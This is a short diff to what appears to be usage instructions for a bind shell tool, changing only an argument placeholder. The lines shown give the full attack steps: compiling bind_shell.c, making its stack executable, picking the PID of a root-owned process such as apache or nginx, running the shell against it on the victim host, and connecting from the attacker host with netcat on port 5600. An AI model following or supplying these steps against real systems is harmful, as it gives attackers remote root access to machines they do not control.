@@ -12,7 +12,7 @@ victim host
 1) $ gcc -o bind_shell bind_shell.c
 2) $ execstack -s bind_shell
 3) $ ps -eaf -> find pid number under root (apache, nginx, python, etc)
-4) $ ./bind_shell <pid number>
+4) $ ./bind_shell pid_number
 
 attacker host
 1) $ nc victim_host 5600
